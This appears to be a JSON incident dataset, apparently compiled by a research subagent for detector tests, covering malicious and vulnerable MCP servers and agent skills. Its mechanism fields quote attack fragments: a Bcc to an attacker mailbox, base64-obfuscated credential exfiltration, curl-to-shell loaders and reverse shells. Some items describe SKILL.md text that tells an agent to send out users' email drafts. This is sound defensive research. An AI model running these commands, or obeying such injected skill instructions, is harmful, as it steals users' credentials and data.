@@ -1,0 +1,284 @@
+{
+  "set": "incidents-v1",
+  "collected_at": "2026-11-02T22:25:44+08:00",
+  "collected_by": "research subagent (web_search + web_fetch), lead spot-checked postmark-mcp (Snyk) and the CVE-2025-53107 advisory title only",
+  "status": "Targets of 10 verified items per category NOT reached: malicious 4 (1 weak), vulnerable 9. Several sources are secondary or truncated; see per-item verification and sources.",
+  "counts": {
+    "malicious": 4,
+    "vulnerable": 9
+  },
+  "items": [
+    {
+      "id": "postmark-mcp-npm-bcc-backdoor",
+      "category": "malicious",
+      "ecosystem": "npm",
+      "project_name": "postmark-mcp (impersonating ActiveCampaign/Postmark MCP server)",
+      "package_or_repo": "postmark-mcp",
+      "affected_versions": "Suspected malicious versions: starting 1.0.16 (later versions possibly affected)",
+      "summary": "A copy of the Postmark MCP server on npm had one added line that blind-copies every email sent through the MCP server to an external address.",
+      "mechanism": "Diff from benign 1.0.15 to malicious release is a single change in the email-send tool: an added Bcc header to an attacker-controlled address, alongside the original ReplyTo line. Code fragment: Bcc: 'phan@giftshop.club', ReplyTo: from || defaultSender",
+      "exfil_or_attack_channel": "Hard-coded Bcc to attacker mailbox (phan@giftshop.club) through the Postmark send API",
+      "still_downloadable": false,
+      "sources": [
+        "https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html",
+        "https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "Malicious 1.0.16 released 2025-09-17 (Koi, via THN); THN article 2025-09-29",
+      "notes": "THN says the developer deleted the npm package; Snyk says it 'does not exist on npm and likely has been removed'. Koi primary blog was not fetchable (cross-origin redirect); THN and Snyk used."
+    },
+    {
+      "id": "clawhavoc-clawhub-malicious-skills",
+      "category": "malicious",
+      "ecosystem": "skills-marketplace",
+      "project_name": "ClawHub skills marketplace for OpenClaw (ClawHavoc campaign, 341 malicious skills)",
+      "package_or_repo": "https://www.clawhub.ai/skills",
+      "affected_versions": null,
+      "summary": "Hundreds of ClawHub skills with professional-looking docs tell users to run a 'Prerequisites' install step that delivers a macOS infostealer or a Windows trojan.",
+      "mechanism": "SKILL.md 'Prerequisites' section asks the user to paste an obfuscated shell command from glot.io into Terminal (macOS) or to download a password-protected 'openclaw-agent.zip' from GitHub (Windows). The script fetches a second-stage shell script from a raw IP, which pulls a universal Mach-O binary consistent with Atomic Stealer (AMOS). Other skills contain reverse shells inside functional code (better-polymarket, polymarket-all-in-one) or read ~/.clawdbot/.env and send it to a webhook.site URL (skill 'rankaj').",
+      "exfil_or_attack_channel": "Obfuscated curl-to-shell from remote IP 91.92.242[.]30 (per THN); reverse shell; HTTP POST of ~/.clawdbot/.env to webhook.site",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html",
+        "https://airisk.mit.edu/ai-incidents/1368-malicious-openclaw-skills-reportedly-delivered-amos"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2026-02-02 (THN report)",
+      "notes": "Primary Koi report URL (https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) returned a cross-origin redirect error on fetch; facts are from THN (secondary) and the MIT AI Incident entry. Skill names quoted from THN examples."
+    },
+    {
+      "id": "toxicskills-snyk-76-confirmed-malicious-skills",
+      "category": "malicious",
+      "ecosystem": "skills-marketplace",
+      "project_name": "ClawHub and skills.sh agent skills (Snyk ToxicSkills audit, 76 confirmed malicious payloads)",
+      "package_or_repo": "clawhub.ai/zaycv/clawhud; clawhub.ai/zaycv/clawhub1; clawhub.ai/Aslaep123/polymarket-traiding-bot; clawhub.ai/Aslaep123/base-agent; clawhub.ai/Aslaep123/bybit-agent; clawhub.ai/moonshine-100rze/moltbook-lm8; clawhub.ai/pepe276/moltbookagent; clawhub.ai/pepe276/publish-dist",
+      "affected_versions": null,
+      "summary": "Snyk's audit of 3,984 agent skills confirmed 76 skills whose SKILL.md instructions carry credential theft, backdoor or exfiltration payloads, and listed 8 IOC skill URLs.",
+      "mechanism": "Three patterns quoted by Snyk: (1) password-protected archive run from install docs, e.g. curl -sSL <github release>/helper.zip -o helper.zip then unzip -P \"<password>\" helper.zip && chmod +x helper && ./helper; (2) obfuscated exfil in setup, e.g. eval $(echo \"<base64>\" | base64 -d), which decodes to a curl GET to an attacker URL carrying base64 of ~/.aws/credentials; (3) runtime remote instruction loading, e.g. curl https://remote-server.com/instructions.md | source. Also systemctl service-file backdoors and deletion of system files described as observed behaviours.",
+      "exfil_or_attack_channel": "HTTP GET to attacker-controlled collect URL with base64 of ~/.aws/credentials; curl piped to shell/source from remote host; password-protected ZIP to evade scanners",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/",
+        "https://labs.cloudsecurityalliance.org/research/csa-research-note-skill-md-agent-context-poisoning-20260506/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2026-02-05 (Snyk publication)",
+      "notes": "Snyk states 8 of the confirmed malicious skills were still publicly available as of publication (2026-02-05); current status not verified. The IOC list here is a subset of the 76 confirmed; the item is a dataset-level record. Snyk's 'Confirmed malicious' counts are 76 of 3,984 scanned."
+    },
+    {
+      "id": "claude-skill-google-workspace-impersonation-exfil",
+      "category": "malicious",
+      "ecosystem": "skills-marketplace",
+      "project_name": "Unnamed skill impersonating a Google Workspace integration (reported by Snyk)",
+      "package_or_repo": null,
+      "affected_versions": null,
+      "summary": "A skill with a legitimate-looking Google Workspace description had a SKILL.md body that makes Claude Code forward drafted email content to an external endpoint before answering the user.",
+      "mechanism": "Natural-language instruction in SKILL.md body directs the agent to send draft email content, captured via a simulated drafting workflow, to an external endpoint before displaying any response. Abuses the agent's legitimate write access to communication workflows.",
+      "exfil_or_attack_channel": "Agent-initiated outbound request of draft email content to an external endpoint (endpoint not named in the secondary source)",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://labs.cloudsecurityalliance.org/research/csa-research-note-skill-md-agent-context-poisoning-20260506/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": null,
+      "notes": "Only the CSA note (which cites Snyk) was fetched; the original Snyk write-up of this specific skill was not fetched and no skill name or URL is available. Consider this weaker than the other items; it is included because the mechanism is concrete."
+    },
+    {
+      "id": "cve-2025-6514-mcp-remote-command-injection",
+      "category": "vulnerable",
+      "ecosystem": "npm",
+      "project_name": "mcp-remote",
+      "package_or_repo": "mcp-remote",
+      "affected_versions": "All versions starting from 0.0.5 before 0.1.16",
+      "summary": "mcp-remote passes a value taken from an untrusted MCP server's authorization_endpoint response into an OS command, giving remote code execution when a client connects to a malicious server.",
+      "mechanism": "Crafted authorization_endpoint URL returned by the server is used in a shell/OS command invocation without neutralisation (CWE-78).",
+      "exfil_or_attack_channel": "OS command injection via server-controlled authorization_endpoint URL",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://advisories.gitlab.com/npm/mcp-remote/CVE-2025-6514/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2025-07-09 (advisory date)",
+      "notes": "GitLab advisory lists CVSS 3.1 9.6 CRITICAL and fixed version 0.1.16; GHSA-6xpm-ggf7-wc3p and JFrog blog are referenced but not read."
+    },
+    {
+      "id": "cve-2025-49596-mcp-inspector-unauth-rce",
+      "category": "vulnerable",
+      "ecosystem": "npm",
+      "project_name": "MCP Inspector (Model Context Protocol developer tool)",
+      "package_or_repo": "https://github.com/modelcontextprotocol/inspector",
+      "affected_versions": "Versions of MCP Inspector below 0.14.1",
+      "summary": "The Inspector client and its proxy had no authentication, so any web request could make the proxy launch arbitrary stdio MCP commands.",
+      "mechanism": "Missing authentication (CWE-306) between Inspector client and proxy; the /sse endpoint accepts transportType=stdio and a command parameter and launches it.",
+      "exfil_or_attack_channel": "Unauthenticated HTTP request to /sse with transportType=stdio and command=<shell command> (e.g. command=echo as the probe)",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://tracker.crowdsec.net/cves/CVE-2025-49596"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2025-06-13 (CVE published)",
+      "notes": "CrowdSec page: CVSS 9.4; first in-the-wild exploitation observed 2025-10-15. Advisory GHSA-7f8r-222p-6f5g (github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g) fetched but content truncated, not read."
+    },
+    {
+      "id": "cve-2025-59377-mcp-kubernetes-server-command-injection",
+      "category": "vulnerable",
+      "ecosystem": "github",
+      "project_name": "mcp-kubernetes-server (feiskyer)",
+      "package_or_repo": "https://github.com/feiskyer/mcp-kubernetes-server",
+      "affected_versions": "through version 0.1.11",
+      "summary": "The /mcp/kubectl endpoint passes user-supplied kubectl parameters into a shell, so shell metacharacters execute arbitrary OS commands, even in read-only mode.",
+      "mechanism": "subprocess call with shell=True on user-controlled input in command.py (line 38 at commit 78957b6); chained commands via ; | && $() or backticks.",
+      "exfil_or_attack_channel": "Shell injection through HTTP request parameters to /mcp/kubectl",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://www.sentinelone.com/vulnerability-database/cve-2025-59377/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2025-09-15 (NVD publication per SentinelOne timeline)",
+      "notes": "SentinelOne's page is labelled as AI-generated content with a disclaimer; the NVD and GHSA-4hqq-7q79-932p (truncated, unread) are the primary references. SentinelOne says no official patch at its publication time, which conflicts with nothing fetched but should be checked against the repo."
+    },
+    {
+      "id": "cve-2025-53109-53110-mcp-filesystem-path-bypass",
+      "category": "vulnerable",
+      "ecosystem": "npm",
+      "project_name": "Model Context Protocol reference Filesystem server (modelcontextprotocol/servers)",
+      "package_or_repo": "https://github.com/modelcontextprotocol/servers",
+      "affected_versions": "Versions of Filesystem prior to 0.6.4 or 2025.7.01",
+      "summary": "The Filesystem MCP server's allowed-directory check could be bypassed to reach files outside the allowed tree, via symlinks (CVE-2025-53109) or a sibling directory whose path shares a prefix with an allowed directory (CVE-2025-53110).",
+      "mechanism": "CVE-2025-53109: prefix matching and symlink handling in path validation (CWE-59). CVE-2025-53110: colliding path prefix in path validation (CWE-22).",
+      "exfil_or_attack_channel": "Symlink inside an allowed directory pointing outside it; sibling directory whose name shares an allowed directory prefix (filesystem read/write)",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://osv.dev/vulnerability/CVE-2025-53109",
+        "https://osv.dev/vulnerability/CVE-2025-53110"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2025-07-02 (CVE published)",
+      "notes": "OSV records are the primary-data source. Cymulate's 'EscapeRoute' write-up (https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/) was fetched but truncated after the title. Affected ranges in OSV are git commit-based with a 'Filesystem' version marker."
+    },
+    {
+      "id": "cve-2025-68143-68144-68145-mcp-server-git",
+      "category": "vulnerable",
+      "ecosystem": "pypi",
+      "project_name": "mcp-server-git (modelcontextprotocol/servers)",
+      "package_or_repo": "mcp-server-git",
+      "affected_versions": null,
+      "summary": "Three CVEs in the Git MCP server: an unrestricted git_init that can create repositories anywhere, an argument-injection bug, and a path-validation bypass that can be chained.",
+      "mechanism": "CVE-2025-68143: unrestricted git_init (CVSS 6.5). CVE-2025-68144: argument injection (CVSS 6.3). CVE-2025-68145: path validation bypass (CVSS 6.4). Geordie describes a compound chain. Exact code was not readable in the fetched text.",
+      "exfil_or_attack_channel": "Tool-argument paths and git command arguments supplied to the MCP server",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://www.geordie.ai/resources/how-to-actually-patch-cve-2025-68145-cve-2025-68144-and-cve-2025-68143-in-mcp-server-git/",
+        "https://github.com/modelcontextprotocol/servers/issues/4550"
+      ],
+      "verification": "fetched and read",
+      "incident_date": null,
+      "notes": "Geordie advisory is dated 2026-02-10 (article date, not disclosure). Geordie text truncated before the vulnerability details. The GitHub issue #4550 (validate_repo_path opt-in bypass) was fetched but only its title and navigation were readable. SentinelOne and Miggo CVE pages returned 403 or empty content. Affected versions not stated in fetched text."
+    },
+    {
+      "id": "cve-2025-54994-create-mcp-server-stdio-command-injection",
+      "category": "vulnerable",
+      "ecosystem": "npm",
+      "project_name": "@akoskm/create-mcp-server-stdio",
+      "package_or_repo": "@akoskm/create-mcp-server-stdio (https://github.com/akoskm/create-mcp-server-stdio)",
+      "affected_versions": "Prior to version 0.0.13",
+      "summary": "A starter-kit MCP server exposes a tool that runs Node.js child_process exec with untrusted input concatenated into the command string.",
+      "mechanism": "Tool which-app-on-port implemented with child_process exec, concatenating untrusted tool input (CWE-78). Code location: src/index.ts lines 24-40 (per OSV reference).",
+      "exfil_or_attack_channel": "Shell command injection via MCP tool argument",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://osv.dev/vulnerability/CVE-2025-54994"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2025-09-08 (CVE published)",
+      "notes": "OSV lists CVSS 4.0 9.3 CRITICAL. GHSA-3ch2-jxxc-v4xf (https://github.com/akoskm/create-mcp-server-stdio/security/advisories/GHSA-3ch2-jxxc-v4xf) fetched but truncated."
+    },
+    {
+      "id": "mcp-stdio-config-command-execution-ox-2026",
+      "category": "vulnerable",
+      "ecosystem": "other",
+      "project_name": "Anthropic official MCP SDKs (Python, TypeScript, Java, Rust) STDIO transport, and downstream projects (LiteLLM, LangChain, LangFlow, Flowise, Windsurf and others)",
+      "package_or_repo": null,
+      "affected_versions": null,
+      "summary": "OX Security reports a by-design weakness in MCP STDIO configuration that lets a config value run any OS command across SDKs, with about ten CVEs in downstream projects.",
+      "mechanism": "STDIO launch from configuration runs the given command; the STDIO handle is returned only if the command succeeds, but the command has already executed. Four vector classes: authenticated and unauthenticated command injection via MCP STDIO; hardening bypass on direct STDIO configuration; zero-click prompt injection that edits MCP config; network requests to MCP marketplaces that trigger hidden STDIO configuration.",
+      "exfil_or_attack_channel": "Arbitrary OS command execution through MCP STDIO configuration (direct config, prompt-injected config edit, marketplace requests)",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2026-04-20 (THN article; OX analysis the week before)",
+      "notes": "Secondary source only (THN); the OX Security blog was not fetched. CVEs named in the article include CVE-2025-65720, CVE-2026-30623, CVE-2026-30624, CVE-2026-30618, CVE-2026-33224, CVE-2026-30617, CVE-2026-30625, CVE-2026-30615, CVE-2026-26015, CVE-2026-40933 (the article lists CVE-2026-33224 twice; one is probably Jaaz, unverified). Anthropic declined to change the protocol, calling the behaviour expected. Related CVEs: CVE-2025-49596, CVE-2026-22252, CVE-2025-54994, CVE-2025-54136."
+    },
+    {
+      "id": "mcp-python-sdk-oauth-issuer-validation-ghsa-qx49",
+      "category": "vulnerable",
+      "ecosystem": "pypi",
+      "project_name": "MCP Python SDK (modelcontextprotocol/python-sdk), OAuth client",
+      "package_or_repo": "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-qx49-fqc8-xw99",
+      "affected_versions": "1.9.1 through 1.29.1 on the 1.x line and 2.0.0 through 2.1.1 on the 2.x line (fixed in 1.30.0 and 2.2.0)",
+      "summary": "When a malicious MCP server returns 404 for OAuth discovery, the SDK falls back to the server's own OAuth config without checking the issuer, so the client's OAuth secret, authorization code and PKCE verifier are sent to the attacker.",
+      "mechanism": "Fallback path for OAuth metadata skips issuer validation because the authorization-server URL is not yet set; the attacker supplies a token endpoint and falsely declares the victim's real IdP as issuer.",
+      "exfil_or_attack_channel": "OAuth client secret, authorization code and PKCE proof key POSTed to an attacker-controlled token endpoint",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://forkast.news/anthropics-official-mcp-python-sdk-had-an-oauth-credential-stealing-flaw-that-let-any-malicious-server-hijack-your-login/",
+        "https://cycode.com/blog/mcp-python-sdk-oauth-account-takeover/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2026-09-28 (disclosure per Forkast)",
+      "notes": "No CVE assigned; CVSS 7.5 per Forkast. Forkast is a secondary source; the GHSA advisory was not fetched. The Cycode page was fetched but truncated before the technical details. Forkast notes no attacks observed."
+    },
+    {
+      "id": "cve-2025-54136-cursor-mcpoison-trust-bypass",
+      "category": "vulnerable",
+      "ecosystem": "other",
+      "project_name": "Cursor IDE (MCP configuration in .cursor/rules/mcp.json)",
+      "package_or_repo": "https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/",
+      "affected_versions": null,
+      "summary": "Cursor trusts an MCP entry by its key name after one approval, so a repo can later change the command and args of an approved entry and get code execution without a new prompt.",
+      "mechanism": "Attacker commits a benign mcp.json entry, the victim approves it once, then changes the command or args (e.g. to a reverse shell); Cursor re-runs the modified command on repo sync and on every project open.",
+      "exfil_or_attack_channel": "Command execution via modified MCP command/args in workspace .cursor/rules/mcp.json (reverse shell PoC)",
+      "still_downloadable": "unknown",
+      "sources": [
+        "https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/"
+      ],
+      "verification": "fetched and read",
+      "incident_date": "2025-08-05 (Check Point publication)",
+      "notes": "Check Point is the primary researcher. Page was fetched but truncated before the end of the PoC walkthrough. HackTheBox write-up returned 403."
+    }
+  ],
+  "unverified_leads": [
+    {
+      "lead": "Knostic: 'When Auto-Signing Sends Your Wallet: A Malicious MCP Server on npm' (https://www.knostic.ai/blog/when-auto-signing-sends-your-wallet-private-key-to-a-remote-server-a-malicious-mcp-package-on-npm)",
+      "why_unverified": "Fetched, but the returned text was truncated to the title; no package name, version or code mechanism was readable."
+    },
+    {
+      "lead": "Embrace the Red: SKILL.md with hidden Unicode Tag characters instructing Claude Code to exfiltrate repository contents (described in the CSA note; Anthropic fix in Claude Code release of 2026-02-10)",
+      "why_unverified": "Only the CSA secondary summary was read. The original Embrace the Red post was not fetched. It is a researcher demonstration, not a documented in-the-wild skill, so it may not belong in the malicious set."
+    },
+    {
+      "lead": "Malicious npm campaign stealing SSH keys, API tokens, cloud credentials and wallet secrets (https://cybersecuritynews.com/malicious-npm-campaign-steals-ssh-keys-api-tokens/)",
+      "why_unverified": "Search snippet only; not fetched. Not confirmed to be MCP-specific."
+    },
+    {
+      "lead": "CVE-2026-22252 LibreChat remote code execution via MCP stdio (https://www.sentinelone.com/vulnerability-database/cve-2026-22252/); also PT-2026-2183 at dbugs.ptsecurity.com",
+      "why_unverified": "Search snippet only. SentinelOne page not fetched; the PT Security fetch failed with a network error."
+    },
+    {
+      "lead": "CVE-2025-59536 and CVE-2026-21852 Claude Code (hooks in .claude/settings.json, project settings API-key exfiltration), Check Point Research",
+      "why_unverified": "Known only from the CSA secondary note. Primary Check Point page not fetched. Claude Code is an agent client, not an MCP server or skill package, so it may fall outside the test set."
+    },
+    {
+      "lead": "CVE-2025-54994 GHSA-3ch2-jxxc-v4xf and CVE-2025-68144/68145 GHSA/NVD pages; SentinelOne CVE-2025-68145 page",
+      "why_unverified": "Pages fetched but truncated, or blocked (403). Core facts were taken from OSV and Geordie instead."
+    }
+  ],
+  "gaps": [
+    "GitHub GHSA pages truncated in fetch; rely on OSV, GitLab, CrowdSec",
+    "Koi primary ClawHavoc report blocked; item relies on The Hacker News and MIT AI Incident DB",
+    "Live status of the ClawHub IOC skills not checked",
+    "Skill incidents are mostly not downloadable code samples; detector tests use inert reconstructions"
+  ]
+}
